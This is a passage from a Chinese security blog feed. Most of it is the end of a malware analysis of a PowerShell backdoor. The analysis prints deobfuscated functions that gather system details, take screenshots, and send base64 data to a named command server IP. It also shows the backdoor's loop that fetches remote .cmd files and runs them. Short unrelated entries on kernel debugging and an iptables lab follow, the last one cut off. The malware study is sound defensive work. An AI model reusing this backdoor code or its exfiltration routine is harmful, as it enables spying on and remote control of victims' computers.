class="variable">$Lq66fcth</span> = <span class="variable">$_</span>.Exception.Message;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$LAYs5yC59zA8PFhrFm9tP</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$iywj2qtWwLSLvNB</code>是一个<code>WebClient</code>对象,存储了相关信息进行下载.</p><h5 id="fwlKy5wjJIz6CGCbzI-上传功能函数"><a href="#fwlKy5wjJIz6CGCbzI-上传功能函数" class="headerlink" title="fwlKy5wjJIz6CGCbzI() 上传功能函数"></a>fwlKy5wjJIz6CGCbzI() 上传功能函数</h5><p><img src="https://i.loli.net/2019/10/02/jqATBFtdcHDkI8i.png" alt="image.png"></p><p>死循环无限执行.</p><ol><li>gc功能提取<code>%temp%\log.txt</code>内容</li><li>转换为字符串</li><li>返回一个<code>utf-8</code>字符对象</li><li>base64转码</li><li>返回一个<code>utf-8</code>字符对象</li><li>以post方式上传数据</li></ol><p><img src="https://i.loli.net/2019/10/02/euh924LDNOybrXF.png" alt="image.png"></p><p>base64数据传输</p><p><img src="https://i.loli.net/2019/10/02/pX6JFcCebHuMEhI.png" alt="image.png"><img src="https://i.loli.net/2019/10/02/pC64S9NomiXjFcr.png" alt="image.png"></p><p>数据解析.</p><p>到此这个powershell下载上传器大概功能总结完了,简单概括来说就是一个上传电脑信息,下载后门的脚本文件.</p><h3 id="backdoor-powershell-ieee-dat"><a href="#backdoor-powershell-ieee-dat" class="headerlink" title="backdoor powershell ieee.dat"></a>backdoor powershell ieee.dat</h3><p><code>%public%\ieee.dat%</code></p><p>因为服务器已经关闭了,只能跟着师傅md5找样本了.</p><p>从<a href="https://otx.alienvault.com/" target="_blank" rel="noopener">https://otx.alienvault.com</a>找到相关样本信息.</p><h4 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h4><p><img src="https://i.loli.net/2019/10/06/ofkVKibWSslyu12.png" alt="image.png"></p><ol><li>变量u存放的是base64编码后的powershell代码</li><li><code>Encoding]::Unicode.GetString([System.Convert]::FromBase64String($u))</code>解码</li><li><code>gcm i*v*p*s*n</code>匹配<code>Invoke-Expression</code>执行内存中的powershell命令.</li></ol><h4 id="0x02-powershell-后门解析"><a href="#0x02-powershell-后门解析" class="headerlink" title="0x02 powershell 后门解析"></a>0x02 powershell 后门解析</h4><p>文件的代码太多了,现在还是根据看起来像是字符串的地方入手</p><h5 id="wltJBgnP"><a href="#wltJBgnP" class="headerlink" title="wltJBgnP()"></a>wltJBgnP()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> wltJBgnP()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$thaTh2FrqCarDJH_</span> = <span class="variable">$eNV:username</span>;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$thATH2fRqCarDJh_</span> = <span class="string">"Username Error"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ThATh2fRqCarDJH_</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取用户名,失败返回<code>&quot;Username Error&quot;</code></p><p>VDf4TkTOMy3p_Br8UL5nH()</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> VDf4TkTOMy3p_Br8UL5nH()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$tSppY_CTU6rBZN_</span> = (<span class="built_in">Get-WMIObject</span> win32_operatingsystem).name;<span class="variable">$tSppY_CTU6rBzN_</span> = <span class="variable">$tsppy_CTu6RBZN_</span>.replace(<span class="string">":"</span>,<span class="string">";"</span>);&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$TsPPy_cTu6rbZN_</span> = <span class="string">"os Name Error"</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$tSPpy_cTu6rbZN_</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取系统名称将<code>:</code>替换成<code></code>;`失败返回”os Name Error”</p><h5 id="MUHr7u0hahhrAxQ"><a href="#MUHr7u0hahhrAxQ" class="headerlink" title="MUHr7u0hahhrAxQ"></a>MUHr7u0hahhrAxQ</h5><p>接受指令,运行屏幕截图操作,并且以post方式发送base64编码后的png数据,发送到<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=sc&amp;i={GUID}.png</code></p><p>将获取到的cmd命令用<strong>cmd /c</strong>执行,并且将返回的结果数据,经过<code>base64</code>编码,将编码后的数据以<code>Post</code>的方式发送到如下地址<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=res&amp;R={GUID}</code></p><p>如果<code>stratwith</code>函数既没有匹配到<strong>“cmd”</strong>以及<strong>“screenshot”</strong>字符串,则将其用<code>iex</code>命令执行,如果执行成功,就将执行后的返回结果,通过<code>base64</code>编码后,将编码数据以<code>Post</code>方式发送到<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=res&amp;R={GUID}地址</code></p><h5 id="d-1SmifuaaJWTHfuQgh"><a href="#d-1SmifuaaJWTHfuQgh" class="headerlink" title="d_1SmifuaaJWTHfuQgh()"></a>d_1SmifuaaJWTHfuQgh()</h5><p><img src="https://i.loli.net/2019/10/07/HuaI5mAXDM7gOiP.png" alt="image.png">创建webclient对象,模拟代理,下载回显</p><h5 id="n-n9tyYOaI9m6lB"><a href="#n-n9tyYOaI9m6lB" class="headerlink" title="n_n9tyYOaI9m6lB()"></a>n_n9tyYOaI9m6lB()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> n_n9tyYOaI9m6lB(<span class="variable">$XSOhPvlsxIYbHLA8bYyj</span>,<span class="variable">$kc5aUnEOK7xCY7Usl1s</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t45lYeJN</span> = <span class="variable">$kC5auneOk7Xcy7usl1S</span>;</span><br><span class="line">        <span class="variable">$s6d70IV</span> = [System.Net.WebRequest]::Create(<span class="variable">$xsOHpVLsxIybHLa8bYyj</span>);</span><br><span class="line">        <span class="variable">$s6d70iV</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">        <span class="variable">$s6d70Iv</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">        <span class="variable">$wOGrHtrYusWGef</span> = [System.Text.Encoding]::UTF8.GetBytes(<span class="variable">$T45lyeJN</span>);</span><br><span class="line">        <span class="variable">$s6D70iv</span>.Method = <span class="string">"POST"</span>;</span><br><span class="line">        <span class="variable">$s6D70IV</span>.ContentLength = <span class="variable">$wogrHTrYuSwGef</span>.length;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$wogRHtRYuswGEf</span>.Length <span class="nomarkup">-gt</span> <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$QOUGx1Qkwlah9W</span> = <span class="variable">$s6d70iv</span>.GetRequestStream();</span><br><span class="line">            <span class="variable">$qoUgx1Qkwlah9W</span>.Write(<span class="variable">$wOgRHTRyuswGEF</span>, (<span class="number">1</span> - <span class="number">1</span>), <span class="variable">$wogrhtryuswgef</span>.Length);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        [System.Net.WebResponse] <span class="variable">$rAtaxJplMEbTuO8yApqOg</span> = <span class="variable">$S6D70Iv</span>.GetResponse();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rAtAXjpLMeBTuo8Yapqog</span> <span class="nomarkup">-ne</span> <span class="literal">$NUlL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$EgAFhyjSEtNkIMP714inO</span> = <span class="variable">$RatAXjPLMEbtuO8yAPQOg</span>.GetResponseStream();</span><br><span class="line">            [System.IO.StreamReader] <span class="variable">$Cx3Ig4SFBZ75udmdkzK2</span> = <span class="built_in">New-Object</span> System.IO.StreamReader <span class="variable">$EGAfhyjSeTNkIMP714ino</span>;</span><br><span class="line">            [String] <span class="variable">$FsVCEsC5h</span> = <span class="variable">$cx3IG4SfbZ75uDmdkZk2</span>.ReadToEnd();</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fsVcESC5h</span> = (<span class="string">"httpPOST"</span> + <span class="variable">$_</span>.Exception.Message);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$FsVceSC5H</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>第一个参数是请求的地址,第二个参数是请求的内容</li><li><code>[System.Net.WebRequest]::Create</code>传入第一个参数初始化<code>WebRequest</code>实例</li><li>获取本地ie代理,并设置为默认证书</li><li>采用utf-8编码数据</li><li>使用<code>POST</code>发送</li><li>如果长度大于0,发送<code>GetRequestStream().Write()</code>请求山上,然后<code>.GetResponse()</code>接收数据</li><li>如果回显非空,<code>.GetResponseStream()</code>读入数据流,全部读取.</li></ol><h5 id="Aj9VVbP5C"><a href="#Aj9VVbP5C" class="headerlink" title="Aj9VVbP5C()"></a>Aj9VVbP5C()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Aj9VVbP5C()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$Uy7hTSuBKQe33iYx5F74</span> = (<span class="built_in">Get-WmiObject</span> Win32_OperatingSystem).OSArchitecture;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$uy7hTsubkQE33Iyx5f74</span> = <span class="string">"Architecture Error"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$UY7HTSuBkQE33iYX5f74</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取系统位数<code>wmic.exe</code>使用<code>Win32_OperatingSystem).OSArchitecture</code></p><p>错误返回<code>&quot;Architecture Error&quot;</code>.</p><h5 id="Get-Screenshot"><a href="#Get-Screenshot" class="headerlink" title="Get-Screenshot"></a>Get-Screenshot</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Get-Screenshot</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">Add-Type</span> -Assembly System.Windows.Forms;</span><br><span class="line">    <span class="variable">$I6G70ff34UmS</span> = [Windows.Forms.SystemInformation]::VirtualScreen;</span><br><span class="line">    <span class="variable">$EFZ1lbLwseYcDKV7</span> = <span class="built_in">New-Object</span> Drawing.Bitmap <span class="variable">$I6g70Ff34uMS</span>.Width, <span class="variable">$I6g70FF34ums</span>.Height;</span><br><span class="line">    <span class="variable">$sOmy4QAQ9e</span> = [Drawing.Graphics]::FromImage(<span class="variable">$eFz1LbLWSeYcdkv7</span>);</span><br><span class="line">    <span class="variable">$SOmY4QAQ9e</span>.CopyFromScreen( <span class="variable">$I6g70ff34UMs</span>.Location, [Drawing.Point]::Empty, <span class="variable">$I6g70fF34umS</span>.Size);</span><br><span class="line">    <span class="variable">$SoMY4qAq9e</span>.Dispose();</span><br><span class="line">    <span class="variable">$sb3uxBawrTjS5HJ4zIaU</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream;</span><br><span class="line">    <span class="variable">$EFz1lblwseyCdkV7</span>.save(<span class="variable">$SB3uxBAWRtjS5hj4zIaU</span>, [Drawing.Imaging.ImageFormat]::Png);</span><br><span class="line">    <span class="variable">$EFZ1lBLWSeycDkv7</span>.Dispose();</span><br><span class="line">    [convert]::ToBase64String(<span class="variable">$SB3UxbAWrTjS5hj4ZIau</span>.ToArray());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取虚拟屏幕,设置bitmap长宽高,<code>CopyFromScreen</code>将屏幕图像拷贝到新创建的绘制图像的对象中.将图像保存为<code>png</code>图片格式并且将图片数据存入<code>内存流</code>中.将png图片的内存流数据转数组后进行<code>base64</code>编码后返回加密后的值</p><h5 id="S4xKxH-WG0KMOE"><a href="#S4xKxH-WG0KMOE" class="headerlink" title="S4xKxH_WG0KMOE()"></a>S4xKxH_WG0KMOE()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> S4xKxH_WG0KMOE()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$zKxMjXPiRVG_n5lBSQ</span> = D_1smifUAajwThfuQgh(<span class="string">"https://api.ipify.org/"</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ZKxmjXPiRvg_N5LBSq</span> = <span class="string">"IP Error"</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ZKxMJXpIrVG_n5lBSq</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取ip地址,错误返回<code>IP Error</code></p><h5 id="CwC1Fafld-XtJSe6wx"><a href="#CwC1Fafld-XtJSe6wx" class="headerlink" title="CwC1Fafld_XtJSe6wx()"></a>CwC1Fafld_XtJSe6wx()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> CwC1Fafld_XtJSe6wx()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="built_in">Test-Path</span> -Path (<span class="string">"HKCU:\SOFTWARE\Microsoft\key"</span>)) <span class="nomarkup">-eq</span> <span class="literal">$True</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$OEnh0UdnFPnPN</span> = (<span class="built_in">Get-ItemProperty</span> -Path <span class="string">"HKCU:\SOFTWARE\Microsoft\key"</span> -Name SecretKey).SecretKey;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$R_17TGuFklA1FDgTjmDMN</span> = <span class="built_in">New-Item</span> -Path <span class="string">"HKCU:\SOFTWARE\Microsoft"</span> -Name key -Force;</span><br><span class="line">        <span class="built_in">start-sleep</span> -s <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$VgMxEqS7XdszsJidfE</span> = [guid]::NewGuid().Guid;</span><br><span class="line">        <span class="built_in">Set-ItemProperty</span> -Path <span class="string">"HKCU:\Software\Microsoft\key"</span> -Name SecretKey -Value <span class="variable">$VgMxEqS7XDSzSjidfe</span>;</span><br><span class="line">        <span class="built_in">start-sleep</span> -s <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$oEnH0udnFPNpN</span> = <span class="variable">$vGMxEQS7XDSzsJIdfe</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$oenH0udnfpnpN</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查键值是否存在.如果存在获得键值.不存在的话新建项,再创建健值,写入guid.</p><h5 id="QTix4hIfIA2oQE8g"><a href="#QTix4hIfIA2oQE8g" class="headerlink" title="QTix4hIfIA2oQE8g()"></a>QTix4hIfIA2oQE8g()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> QTix4hIfIA2oQE8g()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$UC55RYB_3NieoNp</span> = <span class="built_in">New-Object</span> Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());</span><br><span class="line">        <span class="variable">$mmMfY1GeC_ZHoT3</span> = <span class="variable">$uC55ryb_3Nieonp</span>.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$mMmFY1GeC_ZHoT3</span> <span class="nomarkup">-eq</span> <span class="literal">$TRUe</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$mMMfY1GeC_zHoT3</span> = <span class="string">"Admin"</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> (<span class="variable">$MMMFy1GEC_zHoT3</span> <span class="nomarkup">-eq</span> <span class="literal">$false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$mMMfy1GEc_zhot3</span> = <span class="string">"User"</span>;</span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$mMMFY1gEc_zHoT3</span> = <span class="string">"Error Role"</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mMMfY1GEC_zHoT3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得令牌访问等级,判断是否再鹳狸猿组,是返回Admin,不是返回<code>User</code>.没有的话返回<code>Error Role</code>.</p><h5 id="yKGVMK8K"><a href="#yKGVMK8K" class="headerlink" title="yKGVMK8K()"></a>yKGVMK8K()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function yKGVMK8K()</span><br><span class="line">&#123;</span><br><span class="line">    $N4aN42GXmRJ = Cwc1FAfLd_XTJse6WX;</span><br><span class="line">    $n4an42gxMRj += &quot;:&quot;;</span><br><span class="line">    $n4an42gxMRJ += WlTjBGnp; //Username</span><br><span class="line">    $n4aN42GxMRJ += &quot;:&quot;;</span><br><span class="line">    $N4An42GxMrJ += VDf4TktOMY3P_Br8UL5nH; //SystemNameame</span><br><span class="line">    $N4aN42gxmrJ += &quot;&quot;;</span><br><span class="line">    $N4an42GxMrj += aj9VVbp5c; //OS Arch</span><br><span class="line">    $N4an42gxMrj += &quot;:&quot;;</span><br><span class="line">    $n4aN42GxmrJ += S4XKXh_wG0KMOE; //ip address</span><br><span class="line">    $N4aN42gxmrj += &quot;:&quot;;</span><br><span class="line">    $N4AN42gxMrJ += qTix4hiFia2oQe8G; //UserInrole</span><br><span class="line">    return $n4an42gxMRJ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拼接信息.</p><h5 id="最后的逻辑分析"><a href="#最后的逻辑分析" class="headerlink" title="最后的逻辑分析"></a>最后的逻辑分析</h5><p>8350行左右</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(True)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$xGWoj_n</span> = ykGVMk8k;</span><br><span class="line">    <span class="variable">$VGmxeqS7XdsZsJidfe</span> = CwC1FaFld_xTJSe6Wx;</span><br><span class="line">    n_n9tYyoAi9M6lB (<span class="string">"http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=reg&amp;UU="</span>+&#123;guid&#125;) <span class="variable">$XgWoj_n</span>; //</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$r_17tGufKlA1FDgTjmDMN</span> = d_1smIfUAAjWthFUqGH( <span class="string">"http://83.171.238.62/command/"</span>+&#123;guid&#125;+<span class="string">".cmd"</span>);;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$R_17TgufKla1FdGTjmdmn</span> <span class="nomarkup">-ne</span> (<span class="string">'Error'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$ImSwyJmd_fJGEkqlFUV</span> = <span class="variable">$r_17tGufkla1FDGtJmDmn</span>;</span><br><span class="line">d_1SMIFuAajwtHFuqGh(<span class="string">"http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=uDel&amp;filename="</span>+&#123;guid&#125;+<span class="string">".cmd"</span>);</span><br><span class="line">            mUHr7u0HAhhRaXq <span class="variable">$iMswYJMd_fJGeKQLFUv</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$EI30VubHIRyTC9q5rk878</span> = <span class="variable">$wu9qWfKFH</span>;</span><br><span class="line">    <span class="variable">$KkB6gQH8Z1</span> = <span class="variable">$BZDhtwfnPOb_v_h</span>;</span><br><span class="line">    <span class="variable">$I2w_uXTB</span> = (([int](<span class="number">15770</span> / <span class="number">10</span>))*<span class="variable">$kkB6GQH8Z1</span>);</span><br><span class="line">    <span class="variable">$wu9QWfkfH</span> = ((-<span class="number">2276</span>)*((<span class="number">8153</span> - <span class="number">3952</span>)+(((-<span class="number">3651</span>)-<span class="variable">$Uf4CDF6_B9NwImxt7Hh</span>)*(-<span class="number">39</span> + <span class="number">3047</span>))));</span><br><span class="line">    <span class="variable">$JNipBG0Ov_kT15R</span> = ((((<span class="number">1</span> * <span class="number">1009</span>)*<span class="variable">$V0Jkv8aqZHMdcdppAixIV</span>)+<span class="variable">$uyoxQcm_VhLGn</span>)*((-<span class="number">2374</span>)-((-<span class="number">883</span>)*(-<span class="number">774</span>))));</span><br><span class="line">    <span class="variable">$T9y70kYH</span> = (-(<span class="number">13</span> * <span class="number">211</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>执行上个函数获得系统信息</li><li>上传屏幕截图</li><li>下载<code>.cmd</code>文件</li><li>如果下载内容不为’’Error’’则<code>d_1SMIFuAajwtHFuqGh</code>下载其他<code>.cmd</code>命令,并执行.</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>断断续续把这个样本分析完了,属实体力活啊.感觉整体文章结构没写好.都是从头到尾分析样本文件,最后应该文章里做大致的规划,应该更具有从样本编写者角度来看的分析文章.也从零学会了简单的powershell语法和调试等,调试分析office宏汇编分析和脚本.未来还多需努力,少摸鱼,多学习~.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="样本分析" scheme="http://xwdidi.top/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="逆向" scheme="http://xwdidi.top/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>双机调试简单问题</title>
    <link href="http://xwdidi.top/2019/08/24/2019-08-24-%20%E5%8F%8C%E5%87%BB%E8%B0%83%E8%AF%95%E7%AE%80%E5%8D%95%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://xwdidi.top/2019/08/24/2019-08-24- 双击调试简单问题总结/</id>
    <published>2019-08-23T16:00:00.000Z</published>
    <updated>2019-08-23T16:06:46.961Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在虚拟机正常安装 VirtualKD, 然后再执行下命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`bcdedit ``/``dbgsettings SERIAL DEBUGPORT:``<span class="number">1</span>` `BAUDRATE:``<span class="number">115200</span>`</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="环境搭建" scheme="http://xwdidi.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="调试" scheme="http://xwdidi.top/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>iptables简单小结</title>
    <link href="http://xwdidi.top/2019/06/18/2019-06-18-iptables%E7%AE%80%E5%8D%95%E5%B0%8F%E7%BB%93/"/>
    <id>http://xwdidi.top/2019/06/18/2019-06-18-iptables简单小结/</id>
    <published>2019-06-18T06:19:36.000Z</published>
    <updated>2019-06-18T15:06:33.244Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h3><p>最近这段时间学校要让我们做一些小实验.</p><p>一个实验就是配置iptables: 1.完全屏蔽外网 2.内网只能向外访问http&amp;https&amp;ftp服务.</p><p>然后我将这个总结于对端口进行数据包过滤就好了,不知道这样对不对希望可以指出我的错误.(图解http没怎么看过..</p><p>这样就简单了,上网学习iptables相关命令编写就完事了,不过相关底层原理感觉蛮有意思的,看的<a href="https://blog.csdn.net/qq_38892883/article/details/79709023" target="_blank" rel="noopener">这篇文章</a></p><p>学习的..</p><p>这是简单的shell脚本,运行就行了.本机环境是<code>ubuntu16.04</code>.采用<code>nc</code>和<code>telnet</code>相互验证端口畅通性.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 